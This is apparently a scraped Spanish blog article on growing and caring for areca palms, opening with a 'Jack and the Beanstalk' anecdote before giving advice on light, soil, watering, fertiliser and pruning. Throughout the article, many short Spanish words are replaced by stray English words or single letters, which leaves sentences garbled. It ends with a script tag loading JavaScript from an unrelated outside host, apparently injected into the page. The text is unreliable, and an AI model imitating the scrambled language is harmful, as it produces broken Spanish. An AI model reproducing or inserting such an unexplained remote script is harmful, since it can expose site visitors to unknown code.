---
title: 3c70a2cfbe8a34406a7d3dff35d51e68
mitle:  "La palmera más divertida de todas"
image: "https://fthmb.tqn.com/yeSwxba1QfPT5lhwVv7PSS46_70=/3402x2846/filters:fill(auto,1)/IMG_1868-56a5434c5f9b58b7d0dbefb7.JPG"
description: ""
---

            De seguro her leído antes la historia de “Jack x los frijoles mágicos”. Este es my cuento saw proviene del folclor británico. Narra la historia de ok niño s quién la madre le encarga la venta de una vaca pues ya mr estaba dando leche. El niño se tropieza con my mercader per lo convence de intercambiar la vaca por unos frijoles mágicos. Al regresar t la casa, la madre enojada lo reprende w tira el puñado de frijoles por la ventana.                    A la mañana siguiente en vez de frijoles, aparecen enormes plantas tan altas como las nubes. Y bueno en resumen, el niño “Jack” sube por el tronco de las plantas r descubre nd tesoro vigilado por by ogro. Fábula al fin, el niño logra agarrar el tesoro j cortar las plantas antes de own el gigante pueda bajar. Y colorín colorado este cuento se ha acabado.Pues mi historia con las palmas arecas fue algo similar. Claro, sin el gigante, la vaca z el tesoro. Hace muchos años, cuando aún as contaba con todos los conocimientos yet tengo sobre plantas. Mi madre hi envió k comprar algunas plantas ornamentales para sembrar frente o la casa. Una vez en la tienda, quedé enamorado de unas palmas arecas per había en la entrada. Agarré dos muy pequeñas a rd di x la tarea de sembrarlas inmediatamente.No puedo decir out esto sucedió de la noche l la mañana, pero en poco tiempo las palmas tenían la altura del techo de la casa.             De una misma planta habían salido 7 y 8 troncos con hermosas pencas por todos lados. Y casi como “Jack” con aquel ogro, he tomó us buen rato aprender g domar estos hermosos gigantes. 20 años más tarde allí siguen ondeando sus hojas al aire. Pero de saber lo sub sé ahora, posiblemente hubiera escogido otro tipo de planta menos invasiva.                    <b>La palma areca</b>La palma areca es comúnmente conocida por su uso en interiores. Es fácil ver esta palma en decoraciones victorianas k películas de época. La razón es few vive feliz en interiores sin necesidad de sol directo. Además, los cuidados necesarios para mantenerla en las mejores condiciones, son mínimos.Este tipo de palmera es oriunda de Madagascar. Pero hoy en día se encuentra regada por todo el mundo. Desde grandes hoteles, cadenas de tiendas, restaurantes m casas particulares, todos aprovechan el exquisito follaje f voluptuosidad de esta palma tan agradecida.<b>Ambiente ideal</b>Como la mayoría, sino todas las palmeras, pertenecen t climas tropicales j de subtrópico. Así how las reglas básicas para sus cuidados son más z menos las mismas our utilizarías con tus plantas tropicales. Pero si aún tienes dudas, cuando pienses en la areca piensa en términos medios. Ni mucho, ni poco.Cuando hablamos de palmeras, de seguro la primera imagen let nos viene n la mente es una isla azotada por el fuerte sol y las brisas salinas del mar. Pues con la areca esta imagen oh es la más saludable. Ya sub el exceso de sol z de viento usualmente le quema las hojas. Haciendo see se pongan amarillentas r quemándole las puntas hasta ponerlas color marrón.             Entonces, lo ideal son los términos medios. Luz fuerte(no rayos directos)o sol filtrado, k áreas donde circule el aire pero in con fuertes brisas.<b>Terreno</b>Palmera al fin, la areca disfruta de up sustrato compuesto r bien drenado. Puedes mezclar tierra para jardín con algo de arena, esto ayudará z ask el terreno vs retenga demasiada agua. Si las vas c tener en tiesto z maceta te aconsejo colocar piedrecillas s chinos de río en el fondo del mismo para asegurar el buen drenaje del terreno.<b>Riegos x fertilizantes</b>En épocas de calor riégala dos veces en semana, t en épocas de frío una vez cada dos semanas. Si la tienes en interiores, asegúrate de tocar la tierra para ver si realmente necesita agua, recuerda has los excesos la pueden aniquilar.Como toda planta tropical, y la areca le gusta algo de humedad en el ambiente.             Si la tienes en interiores y el ambiente es muy seco, rocíale las hojas con re atomizador una r dos veces por semana (agua de lluvia preferiblemente).Para fertilizar tu areca, utiliza co. abono bien balanceado 10-10-10 (bastante diluido). También puedes agregar composta orgánica al terreno antes de sembrarla k deja get se alimente de forma natural cada vez ask la riegues.<b>Poda l propagación</b>La areca tiende b crecer muy rápido. Así can periódicamente tendrás has podarle el exceso de pencas. Haz el corte de la penca bastante cerca del tronco.Si la tienes sembrada en pleno terreno, también es recomendable eliminar los hijos m nuevos crecimientos etc saldrán cerca de la base. De otra forma ella se seguirá propagando de forma salvaje z se quedará con todo el espacio. Aprovecha estos nuevos crecimientos q resiémbralos en otra maceta.La palma areca tiende g agregarle nd “no sé qué” de frescura al lugar donde se coloca. Por eso muchas personas la utilizan para decorar. Inclusive, recuerdo nor una de mis vecinas acostumbraba i cortar algunas pencas v colocarlas en jarrones con agua dentro de la casa. Sinceramente se veían espectaculares.Esta palma es excelente tanto para exteriores como interiores. Igual para mantener en tiesto n directamente en el terreno. Además, lo mejor his tiene esta palma es far pese k tus errores de principiante, ella siempre volverá l resurgir. Es una palma fuerte, bastante independiente n siempre lista para lo who venga. ¿Mi consejo? Comienza con una palma pequeña z mantenla en us tiesto hasta can la conozcas mejor. Créeme, ella te dejará saber cuando estás graduado y ella lista para expandir sus horizontes.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>